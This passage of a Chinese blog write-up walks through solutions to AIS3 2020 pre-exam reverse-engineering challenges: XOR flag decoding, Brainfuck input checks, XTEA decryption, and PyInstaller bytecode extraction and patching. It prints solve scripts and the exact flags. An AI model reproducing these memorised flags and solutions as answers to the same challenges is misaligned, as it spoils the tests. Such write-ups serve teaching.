其實就是讀進來的譜面檔案 Control/GameControl.java143144145146147148149150151152153154155156157158159160161162163while (br.ready()) &#123; final String s = br.readLine(); if (s.charAt(0) != &#x27;*&#x27;) &#123; final int a = Integer.parseInt(s); this.cache.add(a); for (int k = 0; k &lt; 5; ++k) &#123; if ((a &gt;&gt; k &amp; 0x1) == 0x1) &#123; if (k != 4) &#123; (this.note = new JLabel(this.bt)).setBounds(bounds[k], this.y, 100, 40); &#125; else &#123; (this.note = new JLabel(this.fx)).setBounds(bounds[k], this.y, 350, 40); &#125; this.pFumen.add(this.note); this.check.get(k).add(this.y); ++this.total; &#125; &#125; this.y += this.distance; &#125;&#125; 看到這裡基本上可以想到幾個解法： 改 if(t == mc) 的 bytecode 讓他直接通過 找到 cache，模仿 code 自己 decrypt 改 source code 然後重新編譯 遊戲修改器 … 因為沒做什麼奇怪的事情，所以上面的解法應該都是做得到的，不過還是最推薦第二個做法，因為我 Mac 也會跑版，所以還是寫腳本解實在，當然你要直接抽 code 出來寫一個 java 也行： solve.py#!/usr/bin/env python3flag = [89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 109, 97, 73, 110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 71, 114, 125, 68, 105, 127, 124, 94, 103, 46, 107, 97, 104]with open(&#x27;AIS3_2020_pre/Fallen_Beat/songs/gekkou/hell.txt&#x27;) as f: lines = filter(lambda l: &#x27;*&#x27; not in l, f.readlines()[1:])for idx,line in enumerate(lines): flag[idx%len(flag)] ^= int(line)print(bytes(flag)) Flag: AIS3&#123;Wow_how_m4ny_h4nds_do_you_h4ve&#125; 🧠 Stand up!Brain題目敘述 又到了 Brain tell 咪 ㄜ joke 的時間了這次輪到你說個笑話來聽聽了 題解題目給的是一個用 Ｃ 寫的 Brainfuck interpreter，老梗，但不知道也沒關係，還是可以透過逆向看懂。 這裡用 radare2 disassemble，0x7e2 這裡可以看到輸入是 6 個字，推測輸入正確的 6 個字就會拿到 flag： scanflea rax, [var_eh]mov rsi, rax; const char *format; &quot;%6s&quot;lea rdi, [0x00000a84]mov eax, 0; int scanf(const char *format)call sym.imp.__isoc99_scanf;[oc]mov dword [var_24h], 0jmp 0x853 可以嘗試暴搜正確的 6 個字是什麼，但滿久的，繼續往下看，0x853 跟 0x81c 這裡是一個 for 迴圈，每個迴圈做的事情是把 input 拿出來放到 0x00201380 的 array 上並且再補上一個元素 1，所以 array 0x00201380 最後會變成 [input[0], 1, input[1], 1, input[2], 1, input[3], 1, input[4], 1, input[5], 1]： for_loop[0x81c]CODE XREF from main @ 0x857mov eax, dword [var_24h]lea edx, [rax + rax]mov eax, dword [var_24h]cdqemovzx ecx, byte [rbp + rax - 0xe] ; get char at input[ecx]movsxd rdx, edxlea rax, [0x00201380]mov byte [rdx + rax], clmov eax, dword [var_24h]add eax, eaxadd eax, 1movsxd rdx, eaxlea rax, [0x00201380]mov byte [rdx + rax], 1add dword [var_24h], 1 再往下看，會看到引用一串 data，這一串就是 Brainfuck 程式碼： -------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++.[-]]]]]]] 如果不知道 Brainfuck 還是能透過逆向知道這個語言的大概，程式在 0x986 的地方進入一個很大的 for loop，0x869 這裏開始是 switch 的範圍檢查，然後往下一點 0x87f 這裡是 switch 決定去哪個 case，這裡的 radare2 下的註解是錯的，因為最小的 case +(0x2b) 到最大的 case ](0x5d) 閉區間長度是 51，但其實只有 7 個 case： switch0x87f [oi]mov eax, eaxlea rdx, [rax*4]lea rax, [0x00000a9c]mov eax, dword [rdx + rax]movsxd rdx, eaxlea rax, [0x00000a9c]add rax, rdx; switch table (51 cases) at 0xa9c;-- switchjmp rax 這幾個 case 是 +、-、&lt;、&gt;、[、]、.，看一下就可以知道每個符號的意義了，打下去太多，略一波wiki。所以現在可以回頭看那一串 Brainfuck 在幹嘛了，基本上 -------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[..略..] 其實就是 if ，所以全部的 code 就是巢狀的 if，拿個簡略的狀況說明，下面這段 code 的邏輯是 if(var0==1)&#123;..略..&#125;： # 假設記憶體長這樣 memory[4,1]--[&gt;[-]&lt;[-]]&gt;[..略..] 一開始 -- 會把記憶體上的 memory[0] 扣 2 變成 2，執行到[時如果當前指標指到的記憶體位置不是0就會進入[&gt;[-]&lt;[-]]，[&gt;[-]&lt;[-]]做的事情是把下一個位置（memory[1]）扣成 0 然後再把指標移回來memory[0]，清空 memory[0]，所以當執行到 &gt;[...略...] 時，第一個&gt;移動指標到memory[1]，是 0就不會去執行 [...略...]，那如果重新來過，記憶體上的 4 一開始是 2 的話： # 假設記憶體長這樣 memory[2,1]--[&gt;[-]&lt;[-]]&gt;[..略..] 一開始 -- 會把記憶體上的 memory[0] 扣 2 變成 0，執行到[時因為現在指向的記憶體數值是 0 所以不會進入[&gt;[-]&lt;[-]]，跳到後面執行&gt;[...略...]，第一個&gt;移動指標到memory[1]，是 1，就會執行[...略...]。 到這裡就很清楚了，輸入的 ascii code 要等於前面有幾個-，這樣才會通過判定，可以知道正確的輸入是[67, 56, 55, 54, 51, 33]就是C8763!，把邏輯換成 C 會像是這樣： pseudo_code12345678910111213if(input[0] == &#x27;C&#x27;)&#123; if(input[1] == &#x27;8&#x27;)&#123; if(input[2] == &#x27;7&#x27;)&#123; if(input[3] == &#x27;6&#x27;)&#123; if(input[4] = &#x27;3&#x27;)&#123; if(input[5] = &#x27;!&#x27;)&#123; print flag &#125; &#125; &#125; &#125; &#125;&#125; 當然也可以直接跳過所有的if，只執行最後印 flag 的 code 就好了，可以用線上工具。 print_flag&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++. Flag: AIS3&#123;Th1s_1s_br4iNFUCK_bu7_m0r3_ez&#125; 🍹 Long Island Iced Tea題目敘述 長·島·冰·茶我·的·最·愛長·島·冰·茶超·爽·口·感咚咚咚ㄎㄧㄤ咚咚咚ㄎㄧㄤ咚咚咚ㄎㄧㄤ我真的好ㄎㄧㄤ 附這個連結害我寫這篇的時候一直重播 題解這裡就用 decompile 之後的 code 來講解，沒有 IDA 可以用 Ghidra，科普一下，Ghidra 唸作Gee-druh，或是你可以學我念 Costco。 基本上 main 做的事情就是 Zero padding main123456789101112131415161718puts(&quot;My encryptor 0.1&quot;);puts(&quot;I didn&#x27;t implement the decryptor&quot;);puts(&quot;So,you&#x27;ll never find out my secret unless I am drunk&quot;);__isoc99_scanf(&quot;%ms&quot;, &amp;s);v7 = strlen(s);//v8 算出比目前輸入長度大的 8 的倍數，例如 7 會得到 8，17 得到 24v8 = 8 * (v7 / 8 + 1);//重新分配一個大小，而且複製本來的輸入上去s = (char *)realloc(s, v8 + 1);//多出來的部分都放 0，其實就是在做 0 paddingfor ( i = v8; i &gt;= v7; --i ) s[i] = 0;qmemcpy(v10, &quot;dloGtroBedaJybuR&quot;, 16);for ( j = 0; j &lt; v8 / 8 + 1; ++j ) sub_83A(s, v10);for ( k = 0; k &lt; v8; ++k ) printf(&quot;%02hhx&quot;, (unsigned int)s[k]);free(s); 沒什麼特別的，可以繼續往下看： sub_83A12345678910111213141516171819202122__int64 __fastcall sub_83A(unsigned int *a1, __int64 a2)&#123; __int64 result; // rax unsigned int i; // [rsp+1Ch] [rbp-14h] unsigned int v4; // [rsp+20h] [rbp-10h] unsigned int v5; // [rsp+24h] [rbp-Ch] unsigned int v6; // [rsp+28h] [rbp-8h] v4 = *a1; v5 = a1[1]; v6 = 0; for ( i = 0; i &lt;= 0x3F; ++i ) &#123; v4 += (((v5 &gt;&gt; 5) ^ (16 * v5)) + v5) ^ (*(_DWORD *)(4LL * (v6 &amp; 3) + a2) + v6); v6 -= 0x61C88647; v5 += (((v4 &gt;&gt; 5) ^ (16 * v4)) + v4) ^ (*(_DWORD *)(4LL * ((v6 &gt;&gt; 11) &amp; 3) + a2) + v6); &#125; *a1 = v4; result = v5; a1[1] = v5; return result;&#125; 看起來是某種加密或是 hash 算法，如果夠敏感的話應該會注意到這個算法裡面有 magic number 存在，0x61C88647，但要注意，這是 IDA 照 variable type 修正產出的 pseudo code，回去看 assembly，會發現其實是： mov [rbp+var_4], 9E3779B9h 本來是 v6 += 0x9E3779B9，但 IDA 覺得 v6 -= 0x61C88647 比較好，總之只是 2’s complement，其實不管哪一個都可以找關鍵算法 TEA，仔細看一下會發現其實有點不太一樣，但應該足夠模仿寫出 decrypt 的程式了，就反轉操作而已，如果有耐心爬一下 wiki 會發現題目實作的算法是 XTEA，直接用 wiki 上的 decrypt 就行了，要注意的是 main 裡面其實只有加密第一塊 block，所以第一塊被加密了 9 次，只要解密第一塊就好了： main1234567891011121314151617puts(&quot;My encryptor 0.1&quot;);puts(&quot;I didn&#x27;t implement the decryptor&quot;);puts(&quot;So,you&#x27;ll never find out my secret unless I am drunk&quot;);__isoc99_scanf(&quot;%ms&quot;, &amp;s);v7 = strlen(s);v8 = 8 * (v7 / 8 + 1);s = (char *)realloc(s, v8 + 1);for ( i = v8; i &gt;= v7; --i ) s[i] = 0;qmemcpy(v10, &quot;dloGtroBedaJybuR&quot;, 16);//---------------這裡永遠只加密第一塊 block----------------for ( j = 0; j &lt; v8 / 8 + 1; ++j ) sub_83A(s, v10);//------------------------------------------------------for ( k = 0; k &lt; v8; ++k ) printf(&quot;%02hhx&quot;, (unsigned int)s[k]);free(s); 因為只有第一塊有加密： #My encryptor 0.1#I didn&#x27;t implement the decryptor#So,you&#x27;ll never find out my secret unless I am drunk#850a2a4d3fac148269726c5f673176335f6d335f55725f49475f346e645f746831735f31735f6d316e655f746572727974657272795f5f7d0000000000000000In [1]: bytes.fromhex(&quot;850a2a4d3fac148269726c5f673176335f6d335f55725f49475f346e645f746831735f31735f6d316e655f746572727974657272795f5f7d0000000000000000&quot;)Out[1]: b&#x27;\\x85\\n*M?\\xac\\x14\\x82irl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27; 所以這裡就有第二個解法是爆搜 3 byte 的文字(8 - len(&#39;AIS3&#123;&#39;))，賽中 @bronson113 跟我說他有非預期解，只要暴搜 2 byte，我還以為又寫爛 code …，雖然是真的 code 寫爛才敢放這題，不然好像有點太難，不知道要查 magic number 的人應該解不出來，本來是想出那種加密寫錯的沒錯，但怎麼出好像都有點太難，之後才知道原來大家暴搜都有猜字 &#x3D; &#x3D;，好，恩，總之你猜到那個字是 girl 就可以只暴搜 2 byte，聖結石保險起見買三件，保險起見我都搜 3 byte。 bruteforce.py1234567891011from subprocess import *from string import *from itertools import producttarget = open(&quot;./flag&quot;,&#x27;rb&#x27;).read()for cipher in product(printable[:-5],repeat=3): plain = f&quot;AIS3&#123;&#123;&#123;&#x27;&#x27;.join(cipher)&#125;irl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;&#125;&quot;.encode() p = check_output(&quot;./Long\\ Island\\ Iced\\ Tea&quot;,input=plain,shell=True) if p == target: print(plain) break 不過最快的解法還是直接寫 decrypt： decrypt.c12345678910111213141516171819202122232425#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;//copy from wikivoid decipher(uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*64; for (i=0; i &lt; 64; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[0]=v0; v[1]=v1;&#125;int main()&#123; char key[] = &quot;dloGtroBedaJybuR&quot;; char input[] = &#123;0x85,0x0a,0x2a,0x4d,0x3f,0xac,0x14,0x82,0&#125;; for(int r = 0; r &lt; 9 ; r++)&#123; decipher(input,key); &#125; printf(&quot;%sirl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;&quot;,input);&#125; Flag: AIS3&#123;A!girl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125; 補：看完 writeup，大概是一半的人用暴搜，一半的人有認出來是 XTEA，出的不錯？打比賽的時候有遇過 rc4 位移故意寫錯要修，或土炮加密寫錯之類的題目，大概有個兩三題，但覺得出在這裡好像不太好最後產了一題大便題🤔️ 🌹 La vie en rose題目敘述 題解稍微逆向看一下會發現 binary 前面一直使用 _MEIPASS2 這個字串，會被拿去 call GetEnvironmentVariableW 之類的 API，查一下就可以發現這個是 PyInstaller 使用的一個環境變數，PyInstaller 是一個可以把 python 包成執行檔的工具（exe以外也可以），原理是把 python compile 成 bytecode 之後，執行檔執行時會把 bytecode 抓出來執行，不難想到應該會有工具可以把東西拉出來，PyInstaller Extractor。 所有的東西會被抽出來放進 La vie en rose.exe_extracted 資料夾，pyinstallerextractor.py 會告訴你 entry point 是啥： pyinstxtractor.py:86: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module&#x27;s documentation for alternative uses import imp[*] Processing La vie en rose.exe[*] Pyinstaller version: 2.1+[*] Python version: 38[*] Length of package: 9518557 bytes[*] Found 955 files in CArchive[*] Beginning extraction...please standby[+] Possible entry point: pyiboot01_bootstrap[+] Possible entry point: pyi_rth__tkinter[+] Possible entry point: pyi_rth_multiprocessing[+] Possible entry point: rose[*] Found 258 files in PYZ archive[*] Successfully extracted pyinstaller archive: La vie en rose.exe 但如果它給錯，也可以用 grep 找到，因為 python bytecode 的字串是 raw data： $ grep outland *grep: PYZ-00.pyz_extracted: Is a directoryBinary file rose matches 所以我們接下來要做的事情是 decompile rose.pyc，這裡可以用 uncompyle6 來做，但是會有錯誤訊息，原因是 pyc 少了版本 magic number，很好理解，因為 PyInstaller 知道自己在這個 binary 用了什麼版本，所以他可以把 magic number 拔掉來節省空間： uncompyle6 rose.pycTraceback (most recent call last): File &quot;/usr/local/lib/python3.7/site-packages/xdis/load.py&quot;, line 168, in load_module_from_file_object float_version = magic_int2float(magic_int) File &quot;/usr/local/lib/python3.7/site-packages/xdis/magics.py&quot;, line 399, in magic_int2float return py_str2float(magicint2version[magic_int])KeyError: 227During handling of the above exception, another exception occurred:Traceback (most recent call last): File &quot;/usr/local/bin/uncompyle6&quot;, line 8, in &lt;module&gt; sys.exit(main_bin()) File &quot;/usr/local/lib/python3.7/site-packages/uncompyle6/bin/uncompile.py&quot;, line 194, in main_bin **options) File &quot;/usr/local/lib/python3.7/site-packages/uncompyle6/main.py&quot;, line 326, in main do_fragments, File &quot;/usr/local/lib/python3.7/site-packages/uncompyle6/main.py&quot;, line 186, in decompile_file filename, code_objects File &quot;/usr/local/lib/python3.7/site-packages/xdis/load.py&quot;, line 141, in load_module get_code=get_code, File &quot;/usr/local/lib/python3.7/site-packages/xdis/load.py&quot;, line 176, in load_module_from_file_object % (ord(magic[0:1]) + 256 * ord(magic[1:2]), filename)ImportError: Unknown magic number 227 in rose.pyc 但是其實 python import 東西的時候是會檢查 magic number 的，所以 extract 出來的 library 應該都還留著 magic number： $ xxd importlib.pyc | head00000000: 550d 0d0a 0000 0000 0000 0000 e300 0000 U...............00000010: 0000 0000 0000 0000 0000 0000 0008 0000 ................ 所以其實也不需要知道版本， 可以直接拿到 magic number 550d 0d0a。假設不知道這件事情的話，那現在要先知道版本是什麼，要確定版本有幾個方法，執行 binary 去看他載了什麼 dll： 或是像剛剛一樣直接 grep，不然 ls 也行： $ grep python *Include\\pyconfig.h:# pragma comment(lib,&quot;python38_d.lib&quot;)Include\\pyconfig.h:# pragma comment(lib,&quot;python3.lib&quot;)Include\\pyconfig.h:# pragma comment(lib,&quot;python38.lib&quot;)$ ls | grep python python38.dll 知道版本後，可以在 cpython github 找到 magic number： _bootstrap_external.py261262263264265266267268# Python 3.8a1 3400 (move frame block handling to compiler #17611)# Python 3.8a1 3401 (add END_ASYNC_FOR #33041)# Python 3.8a1 3410 (PEP570 Python Positional-Only Parameters #36540)# Python 3.8b2 3411 (Reverse evaluation order of key: value in dict# comprehensions #35224)# Python 3.8b2 3412 (Swap the position of positional args and positional# only args in ast.arguments #37593)# Python 3.8b4 3413 (Fix &quot;break&quot; and &quot;continue&quot; in &quot;finally&quot; #37830) 總之這裡可以直接把 importlib.pyc 550d 0d0a 補到 rose.pyc 前面就好了，但還要另外補上 12 byte，這樣 marshal 偏移到 0x10 才會對，其中包括 timestamp 跟 source size，不是很重要所以就隨便抓一抓也丟進去就好了： head -c 16 PYZ-00.pyz_extracted/importlib.pyc | cat - rose.pyc &gt; rose_ok.pyc 然後試試看 decompile 會遇到 bytecode 錯誤： $ uncompyle6 rose_ok.pyc...Parse error at or near `JUMP_FORWARD&#x27; instruction at offset 222 問題出在 222 JUMP_FORWARD 想要跳去 256 JUMP_BACK 182 &#39;to 182&#39; 但 uncompyle6 出了點問題，我們可以嘗試把 JUMP_FORWARD 256 直接替換成 JUMP_BACK 182： L. 35 220 JUMP_BACK 182 &#x27;to 182&#x27; 222 JUMP_FORWARD 256 &#x27;to 256&#x27; # this line 224_0 COME_FROM 218 &#x27;218&#x27;L. 37 224 LOAD_NAME winsound 226 LOAD_METHOD Beep 228 LOAD_NAME floor 230 LOAD_NAME keytone 232 LOAD_NAME note 234 LOAD_CONST 0 236 BINARY_SUBSCR 238 BINARY_SUBSCR 240 CALL_FUNCTION_1 1 &#x27;&#x27; 242 LOAD_CONST 200 244 LOAD_NAME note 246 LOAD_CONST 1 248 BINARY_SUBSCR 250 BINARY_MULTIPLY 252 CALL_METHOD_2 2 &#x27;&#x27; 254 POP_TOP 256_0 COME_FROM 222 &#x27;222&#x27; 256_1 COME_FROM 206 &#x27;206&#x27; 256 JUMP_BACK 182 &#x27;to 182&#x27; 要修改他我們要先找到JUMP_FORWARD 的 opcode 是什麼 import disprint(hex(dis.opname.index(&#x27;JUMP_FORWARD&#x27;)))#0x6e marshal opcode 開始的地方在 0x2e，所以精準要修改的位置是 $0x2e + 222 &#x3D; 0x10c$， 222 的旁邊 220 JUMP_BACK 182 &#39;to 182&#39; 正好是我們要的操作，可以直接複製貼上： 00000100: 6400 1900 640b 6b02 72e0 71b6 6e20 6500 d...d.k.r.q.n e.#修改成00000100: 6400 1900 640b 6b02 72e0 71b6 71b6 6500 d...d.k.r.q.n e. 然後就可以 decompile 了： uncompyle6 rose_ok.pyc &gt; rose.py 直接用註解來解釋在幹嘛： rose.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# uncompyle6 version 3.7.1# Python bytecode 3.8 (3413)# Decompiled from: Python 3.8.0 (default, Oct 28 2019, 16:14:01) # [GCC 8.3.0]# Embedded file name: rose.py# Size of source mod 2**32: 227 bytesimport winsoundfrom time import sleepfrom math import floor#### 這裡單純在算琴鍵音高 ####keytone = &#123;&#x27;a&#x27;: 261.63&#125;pt = keytone[&#x27;a&#x27;]for k in (&#x27;w&#x27;, &#x27;s&#x27;, &#x27;e&#x27;, &#x27;d&#x27;, &#x27;f&#x27;, &#x27;t&#x27;, &#x27;g&#x27;, &#x27;y&#x27;, &#x27;h&#x27;, &#x27;u&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;o&#x27;, &#x27;l&#x27;, &#x27;p&#x27;, &#x27;;&#x27;, &quot;&#x27;&quot;, &#x27;[&#x27;, &#x27;]&#x27;, &#x27; &#x27;): keytone[k] = pt * pow(2, 0.08333333333333333) pt = keytone[k]print(&#x27;Play some music to please me, despicable outlander....&#x27;)print(&quot;\\n ________________________________________________________\\n| | | | | | | | | | | | | | | | | | | | | | | | |\\n| | | | | | | | | | | | | | | | | | | | | | | | |\\n| |w| |e| | |t| |y| |u| | |o| |p| | |[| | | | | |\\n| |_| |_| | |_| |_| |_| | |_| |_| | |_| |_| |_| |\\n| | | | | | | | | | | | | | |\\n| a | s | d | f | g | h | j | k | l | ; | &#x27; | ] | | |\\n|___|___|___|___|___|___|___|___|___|___|___|___|___|___|\\n&quot;)notes = input()play = [[&#x27;-&#x27;, 1]]for note in notes: if note == play[(-1)][0]: play[(-1)][1] += 1 else: play.append([note, 1])#### 空白是休止符，- 用來把音符分成兩組 hh-hh 是兩個4分音符 hhhh 是一個2分音符 ####for note in play: if note[0] == &#x27; &#x27;: sleep(0.2) elif note[0] == &#x27;-&#x27;: continue else: winsound.Beep(floor(keytone[note[0]]), 200 * note[1]) # 發出聲音result = []notes = list(map(ord, notes))#### 先把兩個相鄰的音符相加的值放進 result ####for i in range(len(notes) - 1): result.append(notes[i] + notes[(i + 1)])#### 先把兩個相鄰的音符相減的值放進 result ####for i in range(len(notes) - 1): result.append(notes[i] - notes[(i + 1)])#### result 要等於 constraint，表示輸入的 notes 就是 key，來拿 xor secret 會印出 flag，所以沒辦法繞過，必須要知道 notes 是什麼 ####constraint = [..略..]if result == constraint: secret = [..略..] flag = &#x27;&#x27;.join(map(chr, [secret[i] ^ notes[(i % len(notes))] for i in range(len(secret))])) print(&#x27;That sounds good... I like to write the lyric for it&#x27;) print(flag)else: print(&#x27;I said music, that sounds like diarrhea&#x27;)input()# okay decompiling rose_ok.pyc 看到這裡不難發現其實就是在解聯立方程式，舉例來說，constraint[0] 是 notes[0]+notes[1] 跟 constraint[120] 是 notes[0]-notes[1] 的值，有唯一解，而且我們知道樂譜應該有 121 個 note，因為 len(constraint)=240： solve_note.py1234567891011121314151617#!/usr/bin/env python3constraint = [216, 219, 222, 219, 216, 219, 222, 219, 216, 219, 222, 202, 150, 167, 219, 219, 216, 219, 222, 219, 216, 219, 222, 219, 216, 219, 222, 202, 150, 167, 219, 219, 216, 219, 222, 219, 216, 219, 222, 219, 216, 219, 222, 202, 150, 167, 219, 219, 216, 219, 222, 217, 212, 210, 208, 210, 212, 210, 208, 136, 140, 216, 219, 222, 219, 216, 219, 222, 219, 216, 219, 222, 202, 150, 167, 219, 219, 216, 219, 222, 219, 216, 219, 222, 219, 216, 219, 222, 217, 217, 219, 167, 150, 182, 199, 216, 219, 222, 219, 216, 212, 208, 208, 208, 149, 149, 210, 217, 219, 167, 150, 182, 199, 216, 219, 222, 219, 216, 211, 206, 0, -3, 0, 3, 0, -3, 0, 3, 0, -3, 0, 20, 32, -49, -3, 3, 0, -3, 0, 3, 0, -3, 0, 3, 0, -3, 0, 20, 32, -49, -3, 3, 0, -3, 0, 3, 0, -3, 0, 3, 0, -3, 0, 20, 32, -49, -3, 3, 0, -3, 0, 5, 0, 2, 0, -2, 0, 2, 0, 72, -76, 0, -3, 0, 3, 0, -3, 0, 3, 0, -3, 0, 20, 32, -49, -3, 3, 0, -3, 0, 3, 0, -3, 0, 3, 0, -3, 0, 5, -5, 3, 49, -32, 0, -17, 0, -3, 0, 3, 0, 4, 0, 0, 0, 59, -59, -2, -5, 3, 49, -32, 0, -17, 0, -3, 0, 3, 0, 5, 0]length = len(constraint)//2notes = [ (constraint[i]+constraint[length+i])//2 for i in range(length)] + [notes[-1]-constraint[-1]]# bytes(notes) = b&#x27;lloolloolloo[;lolloolloolloo[;lolloolloolloo[;lolloojjhhjjhh lloolloolloo[;lolloolloolloojol;[[lloollhhhh-hjol;[[lloollg&#x27;secret = [62, 9, 11, 79, 0, 5, 4, 10, 76, 30, 0, 28, 62, 72, 76, 9, 5, 0, 3, 28, 76, 1, 22, 79, 8, 30, 10, 14, 54, 72, 102, 46, 2, 8, 79, 13, 30, 5, 1, 8, 31, 76, 2, 10, 123, 79, 3, 79, 24, 4, 10, 79, 26, 6, 9, 11, 15, 74, 17, 7, 85, 76, 30, 10, 28, 24, 102, 56, 7, 5, 24, 10, 79, 50, 72, 76, 12, 3, 0, 11, 79, 13, 2, 11, 79, 13, 0, 24, 14, 19, 28, 76, 66, 62, 58, 30, 2, 6, 1, 11, 102, 42, 29, 26, 12, 72, 6, 15, 11, 76, 89, 34, 123, 13, 76, 29, 0, 21, 13, 11, 71, 24, 9, 28, 27, 102, 46, 3, 14, 15, 7, 79, 27, 51, 94, 76, 13, 9, 13, 28, 27, 76, 8, 10, 28, 15, 9, 1, 11, 40, 27, 10, 29, 3, 1, 79, 28, 4, 13, 11, 0, 27, 31, 101, 54, 62, 87, 0, 0, 27, 76, 13, 10, 11, 31, 28, 17, 74, 8, 29, 26, 78, 31, 102, 40, 0, 0, 8, 101, 14, 2, 8, 79, 45, 15, 108, 76, 9, 76, 0, 79, 14, 76, 11, 79, 6, 76, 31, 79, 46, 74, 38, 76, 104, 123, 104, 76, 23, 27, 7, 93, 31, 55, 14, 4, 92, 74, 55, 24, 10, 8, 100, 55, 50, 7, 95, 48, 29, 3, 31, 84, 20, 51, 10, 94, 3, 0, 31, 48, 27, 13, 93, 24, 14, 53, 70]flag = &#x27;&#x27;.join(map(chr,[ secret[i]^notes[i%len(notes)] for i in range(len(secret))]))print(flag)#Red like roses fills my dreams#And brings me to the place you rest#White is cold and always yearning#Burdened by a royal test#Black the beast descends from shadows#Yellow beauty burns#Gold#and BTW f l a g i s A I S 3 &#123;th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan&#125; Flag: AIS3&#123;th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan&#125; 以防萬一你想知道這琴譜是那首： 🐉 Uroboros題目敘述 你好啊愛德華大哥哥，真的沒想到你可以到第二十五層來呢！不過就到這裡為止了，接下來就由我 反重力三頭鎖鏈康妮·解放·緋紅 來做你的對手! 出這題才發現，這個 emoji 也太帥了ㄅ，元氣彈？？？ 然後寫 blog 才發現，我 cout 字串的地方迴圈寫錯了🤔️，少印一個拉，哈哈，不過剛好沒輸入踩到那個點，笑到不行。 題解有使用 structure 的 C++ 逆向題，仔細看可以發現，一開始做了一個 circular double linked list，整個環的長度是 314，原本的 code 看起來像是這樣： source.c1516171819202122232425262728node* ring = new node;ring-&gt;prev = ring;ring-&gt;next = ring;ring-&gt;idx = 0;node* work = ring;for(int i = 0 ; i &lt; 313 ; i ++)&#123; node* temp = new node; temp-&gt;idx = 0; temp-&gt;next = work-&gt;next; temp-&gt;prev = work; work-&gt;next = temp; work = temp;&#125; 畫出來長這樣： stateDiagramdot:&quot;...&quot;[*] --&gt; node0node0 --&gt; node1node1 --&gt; node2node2 --&gt; dotdot --&gt; node313node313 --&gt; node0 decompile 後 C++ 長得比較難看懂一點，大致是這樣： // cout &lt;&lt; &quot;Only state alchemists are entitled to know the forbidden secret, show me that you are&quot; &lt;&lt; endl;// 如果你對 c++ 有點認識的話 cout 其實會回傳 ostream，所以 v3 是用來繼續串 endl 用的v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout,&quot;Only state alchemists are entitled to know the forbidden secret, show me that you are&quot;);std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);// string v19;std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(v19);// cin &gt;&gt; v19;std::operator&gt;&gt;&lt;char&gt;(&amp;std::cin, v19);// std::string::iterator v13 = v19.begin();v13 = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::begin(v19);// std::string::iterator v14 = v19.end()v14 = 